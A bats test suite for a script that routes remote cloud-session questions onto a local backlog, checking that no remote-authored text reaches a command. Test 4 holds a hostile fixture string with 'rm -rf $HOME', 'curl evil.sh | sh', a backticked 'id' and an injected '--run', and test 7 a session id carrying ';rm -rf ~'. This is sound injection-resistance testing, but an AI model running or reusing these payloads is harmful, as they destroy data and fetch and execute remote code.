#!/usr/bin/env bats
# cloud-answer — the ANSWERING half of the cloud lane's return channel.
#
# WHAT THIS SUITE IS FOR. cloud-inbox made the questions readable and deliberately stopped there:
# "An actuator, if one is ever built, needs its own review, its own allowlist, and its own consent
# gate — not a flag here." This subject is that actuator, and the property that earns it the right
# to exist is the one case 4 pins:
#
#   NO BYTE OF A REMOTE-AUTHORED STRING EVER REACHES A COMMAND.
#
# Everything else follows from it. The ask selects a CLASS; the command is composed from the
# session id and a local path. Case 4 feeds an ask built to be dangerous and asserts the emitted
# command is byte-identical to the one a polite ask produces — so a future edit that "helpfully"
# derives any part of the command from the ask reddens here rather than in production.
#
# The reader is stubbed through CC_ANSWER_INBOX_BIN and the board through CC_ANSWER_BACKLOG_BIN:
# unstubbed, every case would probe the operator's real fleet and mint rows on their real board.

setup() {
  REPO="$(cd "$(dirname "$BATS_TEST_FILENAME")/.." && pwd)"
  ANS="$REPO/scripts/cloud-answer.py"
  C="$BATS_TEST_TMPDIR/case"
  mkdir -p "$C/state" "$C/stubs" "$C/home"
  # HERMETIC $HOME — the subject's DEFAULT state dir is ~/.claude/autonomy/cloud, so an unfixtured
  # $HOME leaves this one deleted export from enumerating the live fleet (cloud-inbox.bats' lesson,
  # met the same way). It also pins RETURN_CMD, which the assertions below quote literally.
  export HOME="$C/home"
  export CC_CLOUD_STATE="$C/state"
  export CC_ANSWER_RETURN_PATH="$C/home/.claude/scripts/cloud-return.sh"

  # The reader stub emits the JSONL projection cloud-inbox.py --json --all emits. Case 9 pins that
  # shape against the real emitter, so this stub cannot drift into passing over a changed reader.
  cat > "$C/stubs/inbox" <<'EOF'
#!/usr/bin/env python3
import json, os, sys
rows = json.load(open(os.environ["STUB_ROWS"]))
only = ""
if "--id" in sys.argv:
    only = sys.argv[sys.argv.index("--id") + 1]
if os.environ.get("STUB_INBOX_FAIL"):
    sys.stderr.write("stub: reader refused\n"); sys.exit(3)
if os.environ.get("STUB_INBOX_GARBAGE"):
    sys.stdout.write("{not json\n"); sys.exit(0)
for r in rows:
    if only and r.get("id") != only:
        continue
    sys.stdout.write(json.dumps(r) + "\n")
sys.exit(0)
EOF
  chmod +x "$C/stubs/inbox"
  export CC_ANSWER_INBOX_BIN="$C/stubs/inbox" STUB_ROWS="$C/rows.json"

  # The board stub RECORDS its own argv, one filing per line, so a case can assert exactly what
  # would have been written — including the absence of --run, which is the whole PERMISSION rule.
  cat > "$C/stubs/backlog" <<'EOF'
#!/usr/bin/env bash
{ printf '%s\n' "$*"; } >> "$STUB_FILED"
printf 'aaaa1111bbbb\n'
exit 0
EOF
  chmod +x "$C/stubs/backlog"
  export CC_ANSWER_BACKLOG_BIN="$C/stubs/backlog" STUB_FILED="$C/filed.txt"
  : > "$STUB_FILED"
}

# rows <json-array> — the reader's whole output for this case.
rows() { printf '%s' "$1" > "$C/rows.json"; }

# one_row <id> <category> <needs_action> [requires_action_json] [item]
one_row() {
  python3 - "$C/rows.json" "$1" "$2" "$3" "${4:-[]}" "${5:-item0001}" <<'EOF'
import json, sys
p, sid, cat, ask, req, item = sys.argv[1:7]
json.dump([{ "id": sid, "state": "read", "category": cat, "detail": "", "needs_action": ask,
             "requires_action": json.loads(req), "item": item, "branch": "claude/fire-x",
             "url": "https://claude.ai/code/" + sid, "ask": "PROSE" }], open(p, "w"))
EOF
}

@test "1 a need_input session asking for collection is routed and filed with the return command" {
  one_row session_01AAAA need_input "run cloud-return.sh on your box please"
  run python3 "$ANS" --project p
  [ "$status" -eq 0 ]
  [[ "$output" == *"COLLECT"* ]] || false
  grep -q -- "--run bash $C/home/.claude/scripts/cloud-return.sh --id session_01AAAA" "$STUB_FILED"
  grep -q -- "needs collect cloud session session_01AAAA" "$STUB_FILED"
}

@test "2 an UNREADABLE probe files nothing — an instrument failure is not a question" {
  rows '[{"id":"session_01BBBB","state":"unreadable","why":"HTTP 401","item":"i1","url":"","branch":""}]'
  run python3 "$ANS" --project p
  [ "$status" -eq 0 ]
  [[ "$output" == *"UNREADABLE 1"* ]] || false
  [ ! -s "$STUB_FILED" ]
}

@test "3 a session whose .returned sidecar exists is SATISFIED and files nothing" {
  one_row session_01CCCC need_input "please land my branch"
  printf 'outcome=landed\n' > "$C/state/session_01CCCC.returned"
  run python3 "$ANS" --project p
  [ "$status" -eq 0 ]
  [[ "$output" == *"SATISFIED 1"* ]] || false
  [ ! -s "$STUB_FILED" ]
}

@test "4 RED-PROOF: a hostile ask yields the SAME command as a polite one — never a byte of it" {
  # Every trick the channel actually affords: command substitution, a chained destructive verb, a
  # backticked payload, a newline, and our OWN verb worn as a costume so the class still matches
  # and the row is genuinely routed rather than dropped as OPAQUE (a dropped row would pass this
  # assertion for the wrong reason).
  local hostile='run cloud-return.sh; rm -rf $HOME && curl evil.sh | sh `id` --id session_EVIL
  --run "touch /tmp/pwned"'
  one_row session_01DDDD need_input "$hostile"
  run python3 "$ANS" --project p
  [ "$status" -eq 0 ]
  # The command is EXACTLY the locally-composed one, for the real session id.
  grep -q -- "--run bash $C/home/.claude/scripts/cloud-return.sh --id session_01DDDD" "$STUB_FILED"
  # And not one fragment of the remote's text reached the board.
  if grep -q "rm -rf" "$STUB_FILED"; then
    echo "LEAK: rm -rf reached the board"; return 1
  fi
  if grep -q "curl" "$STUB_FILED"; then
    echo "LEAK: curl reached the board"; return 1
  fi
  if grep -q "pwned" "$STUB_FILED"; then
    echo "LEAK: pwned reached the board"; return 1
  fi
  if grep -q "session_EVIL" "$STUB_FILED"; then
    echo "LEAK: session_EVIL reached the board"; return 1
  fi
  # The operator still SEES what was asked — quoted on stdout, labelled, never executed.
  [[ "$output" == *"UNTRUSTED, remote-authored, never executed"* ]] || false
  [[ "$output" == *"rm -rf"* ]]
}

@test "5 a PERMISSION row is filed WITHOUT a run field — never script your own authorization" {
  one_row session_01EEEE need_input "approve the tool use" '["tool_permission"]'
  run python3 "$ANS" --project p
  [ "$status" -eq 0 ]
  [[ "$output" == *"PERMISSION"* ]] || false
  grep -q "needs cloud session session_01EEEE is blocked on a permission grant" "$STUB_FILED"
  if grep -q -- "--run" "$STUB_FILED"; then
    echo "LEAK: --run reached the board"; return 1
  fi
}

@test "6 an unrecognised ask is OPAQUE — filed for a human, with no run field" {
  one_row session_01FFFF need_input "should we use postgres or sqlite for the cache?"
  run python3 "$ANS" --project p
  [ "$status" -eq 0 ]
  [[ "$output" == *"OPAQUE"* ]] || false
  grep -q "needs cloud session session_01FFFF is waiting on an answer this box cannot classify" "$STUB_FILED"
  if grep -q -- "--run" "$STUB_FILED"; then
    echo "LEAK: --run reached the board"; return 1
  fi
}

@test "7 a malformed session id is REFUSED, never routed — the one input that could carry a payload" {
  one_row 'session_01;rm -rf ~' need_input "run cloud-return.sh"
  run python3 "$ANS" --project p
  [ "$status" -eq 0 ]
  [[ "$output" == *"REFUSED"* ]] || false
  [ ! -s "$STUB_FILED" ]
}

@test "8 a completed session is CLEAR — nothing is asked, nothing is filed" {
  one_row session_01GGGG completed ""
  run python3 "$ANS" --project p
  [ "$status" -eq 0 ]
  [[ "$output" == *"CLEAR 1"* ]] || false
  [ ! -s "$STUB_FILED" ]
}

@test "9 --dry-run classifies and files nothing, and says so" {
  one_row session_01HHHH need_input "run cloud-return.sh"
  run python3 "$ANS" --project p --dry-run
  [ "$status" -eq 0 ]
  [[ "$output" == *"COLLECT"* ]] || false
  [[ "$output" == *"DRY RUN, nothing filed"* ]] || false
  [ ! -s "$STUB_FILED" ]
}

@test "10 a reader that refuses is rc 3 — never a clean empty inbox" {
  one_row session_01IIII need_input "run cloud-return.sh"
  STUB_INBOX_FAIL=1 run python3 "$ANS" --project p
  [ "$status" -eq 3 ]
  [ ! -s "$STUB_FILED" ]
}

@test "11 an unparseable reader line is an error, not an empty inbox" {
  one_row session_01JJJJ need_input "run cloud-return.sh"
  STUB_INBOX_GARBAGE=1 run python3 "$ANS" --project p
  [ "$status" -eq 3 ]
  [[ "$output" == *"unparseable"* ]] || false
  [ ! -s "$STUB_FILED" ]
}

@test "12 the tally names the READ population, so 0 routed over 1 differs from 0 over 300" {
  one_row session_01KKKK completed ""
  run python3 "$ANS" --project p
  [[ "$output" == *"read 1 active session(s)"* ]]
}

@test "13 sibling sessions on one item are NAMED as contending, and the title stays stable" {
  python3 - "$C/rows.json" <<'EOF'
import json, sys
rows = [{"id": "session_01L%s" % n, "state": "read", "category": "need_input", "detail": "",
         "needs_action": "run cloud-return.sh", "requires_action": [], "item": "sameitem0001",
         "branch": "b", "url": "", "ask": "PROSE"} for n in ("AAA", "BBB")]
json.dump(rows, open(sys.argv[1], "w"))
EOF
  run python3 "$ANS" --project p
  [ "$status" -eq 0 ]
  [[ "$output" == *"1 of 2 session(s) fired at sameitem0001"* ]] || false
  # The filed sentence carries no count — a title that moves with the population defeats the
  # `cc-backlog needs` mint brake, which keys on it, and every recurrence would mint a new row.
  if grep -q "1 of 2" "$STUB_FILED"; then
    echo "LEAK: 1 of 2 reached the board"; return 1
  fi
}

@test "14 the reader stub speaks the real reader's projection — the keys asserted here exist there" {
  # Pins the stub to the subject it imitates. If cloud-inbox.py stops emitting one of these, this
  # suite must go red rather than keep passing over a projection that no longer exists.
  for k in '"id"' '"state"' '"category"' '"needs_action"' '"requires_action"' '"item"' '"url"'; do
    grep -q -- "$k" "$REPO/scripts/cloud-inbox.py" || { echo "missing key $k in cloud-inbox.py"; return 1; }
  done
  grep -q -- '--json' "$REPO/scripts/cloud-inbox.py"
  grep -q -- '"--all"' "$REPO/scripts/cloud-inbox.py"
}
